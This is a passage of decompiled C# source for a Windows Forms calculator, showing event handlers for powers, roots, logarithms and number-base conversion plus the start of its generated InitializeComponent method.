		double_4 = 180.0 / Math.PI * Conversion.Val(RuntimeHelpers.GetObjectValue(value));
		return double_4;
	}

	private void method_149(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Conversion.Val((object)7.3890560989306495)));
	}

	private void method_150(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(double.TryParse(txtmain.get_Text(), out var result)));
		txtmain.set_Text(Conversions.ToString(Math.Pow(Math.E, result)));
	}

	private void method_151(object sender, EventArgs e)
	{
	}

	private void method_152(object sender, EventArgs e)
	{
	}

	private void method_153(object sender, EventArgs e)
	{
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double num = Conversions.ToDouble(Interaction.InputBox("Type the base value to be powered", "Base Number.?", Conversions.ToString(2), -1, -1));
			double num2 = Conversions.ToDouble(Interaction.InputBox("Type the power", "Power Number.?", Conversions.ToString(36), -1, -1));
			if (Versioned.IsNumeric((object)num) & Versioned.IsNumeric((object)num2))
			{
				txtmain.set_Text(Conversions.ToString(Math.Pow(Conversion.Val((object)num), Conversion.Val((object)num2))));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_154(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Math.Pow(Conversion.Val(txtmain.get_Text()), 2.0)));
	}

	private void method_155(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Math.Log10(Conversions.ToDouble(txtmain.get_Text()))));
	}

	private void method_156(object sender, EventArgs e)
	{
		txtmain.set_Text(Conversions.ToString(Math.Pow(Conversion.Val(txtmain.get_Text()), 3.0)));
	}

	private void method_157(object sender, EventArgs e)
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double newBase = Conversions.ToDouble(Interaction.InputBox("type the base value of logarithem", "Base Value.?", Conversions.ToString(2), -1, -1));
			txtmain.set_Text(Conversions.ToString(Math.Log(Conversions.ToDouble(txtmain.get_Text()), newBase)));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_158(object sender, EventArgs e)
	{
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double num = Conversions.ToDouble(Interaction.InputBox("Type your root number", "Root Number.?", Conversions.ToString(2), -1, -1));
			double num2 = Conversions.ToDouble(Interaction.InputBox("Type your number to be rooted", "Number.?", Conversions.ToString(36), -1, -1));
			if (Versioned.IsNumeric((object)num) & Versioned.IsNumeric((object)num2))
			{
				txtmain.set_Text(Conversions.ToString(Math.Pow(num2, 1.0 / num)));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_159(object sender, EventArgs e)
	{
		double_5 = 13.0;
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + "D");
	}

	private void method_160(object sender, EventArgs e)
	{
		double_5 = 14.0;
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + "E");
	}

	private void method_161(object sender, EventArgs e)
	{
		double_5 = 12.0;
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + "C");
	}

	private void method_162(object sender, EventArgs e)
	{
		double_5 = 11.0;
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + "B");
	}

	private void method_163(object sender, EventArgs e)
	{
		double_5 = 10.0;
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + "A");
	}

	private void method_164(object sender, EventArgs e)
	{
		double_5 = 15.0;
		TextBox val;
		(val = txtmain).set_Text(val.get_Text() + "F");
	}

	private void method_165(object sender, EventArgs e)
	{
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		if (!radio_binary.get_Checked())
		{
			return;
		}
		((Control)btn_2).set_Enabled(false);
		((Control)btn_3).set_Enabled(false);
		((Control)btn_4).set_Enabled(false);
		((Control)btn_5).set_Enabled(false);
		((Control)btn_6).set_Enabled(false);
		((Control)btn_7).set_Enabled(false);
		((Control)btn_8).set_Enabled(false);
		((Control)btn_9).set_Enabled(false);
		((Control)btn_a).set_Enabled(false);
		((Control)btn_b).set_Enabled(false);
		((Control)btn_c).set_Enabled(false);
		((Control)btn_d).set_Enabled(false);
		((Control)btn_e).set_Enabled(false);
		((Control)btn_f).set_Enabled(false);
		((Control)btn_add).set_Enabled(false);
		((Control)btn_subtract).set_Enabled(false);
		((Control)btn_multiply).set_Enabled(false);
		((Control)btn_divide).set_Enabled(false);
		((Control)btn_equal).set_Enabled(false);
		((Control)btn_decimal_point).set_Enabled(false);
		((Control)btn_addminus).set_Enabled(false);
		((Control)grp_algebra).set_Enabled(false);
		try
		{
			if (int_0 == 1)
			{
				DecimalToBinary(Conversions.ToString(2));
			}
			if (int_0 == 3)
			{
				BinaryToDecimal(Conversions.ToString(8));
				DecimalToBinary(Conversions.ToString(2));
			}
			if (int_0 == 4)
			{
				HexaToDecimal(Conversions.ToString(16));
				DecimalToBinary(Conversions.ToString(2));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_166(object sender, EventArgs e)
	{
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		if (!radio_hexadecimal.get_Checked())
		{
			return;
		}
		((Control)btn_2).set_Enabled(true);
		((Control)btn_3).set_Enabled(true);
		((Control)btn_4).set_Enabled(true);
		((Control)btn_5).set_Enabled(true);
		((Control)btn_6).set_Enabled(true);
		((Control)btn_7).set_Enabled(true);
		((Control)btn_8).set_Enabled(true);
		((Control)btn_9).set_Enabled(true);
		((Control)btn_a).set_Enabled(true);
		((Control)btn_b).set_Enabled(true);
		((Control)btn_c).set_Enabled(true);
		((Control)btn_d).set_Enabled(true);
		((Control)btn_e).set_Enabled(true);
		((Control)btn_f).set_Enabled(true);
		((Control)btn_add).set_Enabled(false);
		((Control)btn_subtract).set_Enabled(false);
		((Control)btn_multiply).set_Enabled(false);
		((Control)btn_divide).set_Enabled(false);
		((Control)btn_equal).set_Enabled(false);
		((Control)btn_decimal_point).set_Enabled(false);
		((Control)btn_addminus).set_Enabled(false);
		((Control)grp_algebra).set_Enabled(false);
		try
		{
			if (int_0 == 1)
			{
				DecimalToHexa(Conversions.ToString(16));
			}
			if (int_0 == 2)
			{
				BinaryToDecimal(Conversions.ToString(2));
				DecimalToHexa(Conversions.ToString(16));
			}
			if (int_0 == 3)
			{
				BinaryToDecimal(Conversions.ToString(8));
				DecimalToHexa(Conversions.ToString(16));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_167(object sender, EventArgs e)
	{
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		if (!radio_octal.get_Checked())
		{
			return;
		}
		((Control)btn_2).set_Enabled(true);
		((Control)btn_3).set_Enabled(true);
		((Control)btn_4).set_Enabled(true);
		((Control)btn_5).set_Enabled(true);
		((Control)btn_6).set_Enabled(true);
		((Control)btn_7).set_Enabled(true);
		((Control)btn_8).set_Enabled(false);
		((Control)btn_9).set_Enabled(false);
		((Control)btn_a).set_Enabled(false);
		((Control)btn_b).set_Enabled(false);
		((Control)btn_c).set_Enabled(false);
		((Control)btn_d).set_Enabled(false);
		((Control)btn_e).set_Enabled(false);
		((Control)btn_f).set_Enabled(false);
		((Control)btn_add).set_Enabled(false);
		((Control)btn_subtract).set_Enabled(false);
		((Control)btn_multiply).set_Enabled(false);
		((Control)btn_divide).set_Enabled(false);
		((Control)btn_equal).set_Enabled(false);
		((Control)btn_decimal_point).set_Enabled(false);
		((Control)btn_addminus).set_Enabled(false);
		((Control)grp_algebra).set_Enabled(false);
		try
		{
			if (int_0 == 1)
			{
				DecimalToBinary(Conversions.ToString(8));
			}
			if (int_0 == 2)
			{
				BinaryToDecimal(Conversions.ToString(2));
				DecimalToBinary(Conversions.ToString(8));
			}
			if (int_0 == 4)
			{
				HexaToDecimal(Conversions.ToString(16));
				DecimalToBinary(Conversions.ToString(8));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_168(object sender, EventArgs e)
	{
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		if (!radio_decimal.get_Checked())
		{
			return;
		}
		((Control)btn_2).set_Enabled(true);
		((Control)btn_3).set_Enabled(true);
		((Control)btn_4).set_Enabled(true);
		((Control)btn_5).set_Enabled(true);
		((Control)btn_6).set_Enabled(true);
		((Control)btn_7).set_Enabled(true);
		((Control)btn_8).set_Enabled(true);
		((Control)btn_9).set_Enabled(true);
		((Control)btn_a).set_Enabled(false);
		((Control)btn_b).set_Enabled(false);
		((Control)btn_c).set_Enabled(false);
		((Control)btn_d).set_Enabled(false);
		((Control)btn_e).set_Enabled(false);
		((Control)btn_f).set_Enabled(false);
		((Control)btn_add).set_Enabled(true);
		((Control)btn_subtract).set_Enabled(true);
		((Control)btn_multiply).set_Enabled(true);
		((Control)btn_divide).set_Enabled(true);
		((Control)btn_equal).set_Enabled(true);
		((Control)btn_decimal_point).set_Enabled(true);
		((Control)btn_addminus).set_Enabled(true);
		((Control)grp_algebra).set_Enabled(true);
		try
		{
			if (int_0 != 1)
			{
				if (int_0 == 2)
				{
					BinaryToDecimal(Conversions.ToString(2));
				}
				else if (int_0 == 3)
				{
					BinaryToDecimal(Conversions.ToString(8));
				}
				else if (int_0 == 4)
				{
					HexaToDecimal(Conversions.ToString(16));
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public void DecimalToBinary(string @base)
	{
		string text = txtmain.get_Text();
		string text2 = Conversions.ToString(0);
		string text3 = default(string);
		do
		{
			text2 = Conversions.ToString(Conversions.ToDouble(text) % Conversions.ToDouble(@base));
			text = Conversions.ToString(Conversion.Int(Conversions.ToDouble(text) / Conversions.ToDouble(@base)));
			text3 += text2;
		}
		while (Conversions.ToDouble(text) != 0.0);
		txtmain.set_Text(Strings.StrReverse(text3));
	}

	public void BinaryToDecimal(string @base)
	{
		int num = 0;
		string text = txtmain.get_Text();
		Conversions.ToString(((TextBoxBase)txtmain).get_TextLength());
		text = Strings.StrReverse(text);
		double num2 = default(double);
		do
		{
			string text2 = text.Substring(num, 1);
			num2 += Conversions.ToDouble(text2) * Math.Pow(Conversions.ToDouble(@base), num);
			num = checked(num + 1);
			Console.WriteLine(((TextBoxBase)txtmain).get_TextLength());
		}
		while (num != ((TextBoxBase)txtmain).get_TextLength());
		txtmain.set_Text(Conversions.ToString(num2));
	}

	public void HexaToDecimal(string Base)
	{
		int num = 0;
		string text = txtmain.get_Text();
		text = Strings.StrReverse(text);
		double num2 = default(double);
		do
		{
			string text2 = text.Substring(num, 1);
			switch (text2)
			{
			case "B":
				text2 = Conversions.ToString(11);
				break;
			case "C":
				text2 = Conversions.ToString(12);
				break;
			case "D":
				text2 = Conversions.ToString(13);
				break;
			case "E":
				text2 = Conversions.ToString(14);
				break;
			case "F":
				text2 = Conversions.ToString(15);
				break;
			case "A":
				text2 = Conversions.ToString(10);
				break;
			}
			num2 += Conversions.ToDouble(text2) * Math.Pow(Conversions.ToDouble(Base), num);
			num = checked(num + 1);
		}
		while (num != ((TextBoxBase)txtmain).get_TextLength());
		txtmain.set_Text(Conversions.ToString(num2));
	}

	public void DecimalToHexa(string Base)
	{
		string text = txtmain.get_Text();
		string text3 = default(string);
		do
		{
			string text2 = Conversions.ToString(Conversions.ToDouble(text) % Conversions.ToDouble(Base));
			text = Conversions.ToString(Conversion.Int(Conversions.ToDouble(text) / Conversions.ToDouble(Base)));
			if (Conversions.ToDouble(text2) != 10.0)
			{
				if (Conversions.ToDouble(text2) == 11.0)
				{
					text2 = "B";
				}
				else if (Conversions.ToDouble(text2) == 12.0)
				{
					text2 = "C";
				}
				else if (Conversions.ToDouble(text2) == 13.0)
				{
					text2 = "D";
				}
				else if (Conversions.ToDouble(text2) == 14.0)
				{
					text2 = "E";
				}
				else if (Conversions.ToDouble(text2) == 15.0)
				{
					text2 = "F";
				}
			}
			else
			{
				text2 = "A";
			}
			text3 += text2;
		}
		while (Conversions.ToDouble(text) != 0.0);
		txtmain.set_Text(Strings.StrReverse(text3));
	}

	private void method_169(object sender, EventArgs e)
	{
		if (radio_decimal.get_Checked())
		{
			int_0 = 1;
		}
		if (radio_binary.get_Checked())
		{
			int_0 = 2;
		}
		if (radio_octal.get_Checked())
		{
			int_0 = 3;
		}
		if (radio_hexadecimal.get_Checked())
		{
			int_0 = 4;
		}
		Console.WriteLine("Radio Signal Number : " + int_0);
	}

	private void method_170(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void method_171(object sender, EventArgs e)
	{
		show_about();
	}

	private void method_172(object sender, EventArgs e)
	{
		Console.WriteLine(cmb_box_unit.get_SelectedIndex());
	}

	private void method_173(object sender, MouseEventArgs e)
	{
	}

	private void method_174(object sender, EventArgs e)
	{
	}

	private void method_175(object sender, EventArgs e)
	{
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (Operators.CompareString(txtmain.get_Text(), "", false) == 0)
			{
				return;
			}
			double_1 = Conversions.ToDouble(Interaction.InputBox("Type the destination (r) value of n∑r ", "n∑r Calculation", Conversions.ToString(1), -1, -1));
			if (Versioned.IsNumeric((object)double_0))
			{
				if (txtmain.get_Text().Contains("."))
				{
					Conversions.ToDecimal(txtmain.get_Text());
					txtmain.set_Text(Conversions.ToString(Conversions.ToInteger(txtmain.get_Text())));
				}
			}
			else
			{
				Interaction.MsgBox((object)"The second value need to be typed to proceed", (MsgBoxStyle)48, (object)null);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_176(object sender, EventArgs e)
	{
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			txtmain.set_Text(Conversions.ToString(Conversions.ToInteger(txtmain.get_Text())));
			if (Operators.CompareString(txtmain.get_Text(), "", false) != 0 && txtmain.get_Text().Contains("."))
			{
				Conversions.ToDecimal(txtmain.get_Text());
				txtmain.set_Text(Conversions.ToString(Conversions.ToInteger(txtmain.get_Text())));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_177(object sender, EventArgs e)
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double_0 = Conversions.ToDouble(Interaction.InputBox("Type the value of n of nCr", "nCr Calculation", Conversions.ToString(1), -1, -1));
			double_1 = Conversions.ToDouble(Interaction.InputBox("Type the value of r of nCr", "nCr Calculation", Conversions.ToString(1), -1, -1));
			if (!Versioned.IsNumeric((object)double_0) | !Versioned.IsNumeric((object)double_1))
			{
				MessageBox.Show("You need to type a numerical integer value to proceed");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Expected O, but got Unknown
		//IL_02ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected O, but got Unknown
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		//IL_0370: Expected O, but got Unknown
		//IL_0371: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Expected O, but got Unknown
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Expected O, but got Unknown
		//IL_0387: Unknown result type (might be due to invalid IL or missing references)
		//IL_0391: Expected O, but got Unknown
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Expected O, but got Unknown
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Expected O, but got Unknown
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b2: Expected O, but got Unknown
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bd: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d3: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Expected O, but got Unknown
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ff: Expected O, but got Unknown
		//IL_0400: Unknown result type (might be due to invalid IL or missing references)
		//IL_040a: Expected O, but got Unknown
		//IL_040b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0415: Expected O, but got Unknown
		//IL_041c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0426: Expected O, but got Unknown
		//IL_0427: Unknown result type (might be due to invalid IL or missing references)
		//IL_0431: Expected O, but got Unknown
		//IL_0432: Unknown result type (might be due to invalid IL or missing references)
		//IL_043c: Expected O, but got Unknown
		//IL_043d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected O, but got Unknown
		//IL_0453: Unknown result type (might be due to invalid IL or missing references)
		//IL_045d: Expected O, but got Unknown
		//IL_045e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0468: Expected O, but got Unknown
		//IL_0469: Unknown result type (might be due to invalid IL or missing references)
		//IL_0473: Expected O, but got Unknown
		//IL_0474: Unknown result type (might be due to invalid IL or missing references)
		//IL_047e: Expected O, but got Unknown
		//IL_047f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0489: Expected O, but got Unknown
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0520: Expected O, but got Unknown
		//IL_05bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c9: Expected O, but got Unknown
		//IL_0668: Unknown result type (might be due to invalid IL or missing references)
		//IL_0672: Expected O, but got Unknown
		//IL_0711: Unknown result type (might be due to invalid IL or missing references)
		//IL_071b: Expected O, but got Unknown
		//IL_07ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c4: Expected O, but got Unknown
		//IL_0863: Unknown result type (might be due to invalid IL or missing references)
		//IL_086d: Expected O, but got Unknown
		//IL_090c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0916: Expected O, but got Unknown
		//IL_09b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c2: Expected O, but got Unknown
		//IL_0a64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6e: Expected O, but got Unknown
		//IL_0b11: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1b: Expected O, but got Unknown
		//IL_0bc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bcb: Expected O, but got Unknown
		//IL_0c6e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c78: Expected O, but got Unknown
		//IL_0d1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d25: Expected O, but got Unknown
		//IL_0dc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd2: Expected O, but got Unknown
		//IL_0e75: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e7f: Expected O, but got Unknown
		//IL_0f1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f29: Expected O, but got Unknown
		//IL_0fcc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd6: Expected O, but got Unknown
		//IL_1079: Unknown result type (might be due to invalid IL or missing references)
		//IL_1083: Expected O, but got Unknown
		//IL_1123: Unknown result type (might be due to invalid IL or missing references)
		//IL_112d: Expected O, but got Unknown
		//IL_11cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d7: Expected O, but got Unknown
		//IL_127d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1287: Expected O, but got Unknown
		//IL_132d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1337: Expected O, but got Unknown
		//IL_13d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13e3: Expected O, but got Unknown
		//IL_1485: Unknown result type (might be due to invalid IL or missing references)
		//IL_148f: Expected O, but got Unknown
		//IL_152f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1539: Expected O, but got Unknown
		//IL_15dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_15e6: Expected O, but got Unknown
		//IL_1689: Unknown result type (might be due to invalid IL or missing references)
		//IL_1693: Expected O, but got Unknown
		//IL_1733: Unknown result type (might be due to invalid IL or missing references)
		//IL_173d: Expected O, but got Unknown
		//IL_17dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_17e7: Expected O, but got Unknown
		//IL_1887: Unknown result type (might be due to invalid IL or missing references)
		//IL_1891: Expected O, but got Unknown
		//IL_1931: Unknown result type (might be due to invalid IL or missing references)
		//IL_193b: Expected O, but got Unknown
		//IL_19db: Unknown result type (might be due to invalid IL or missing references)
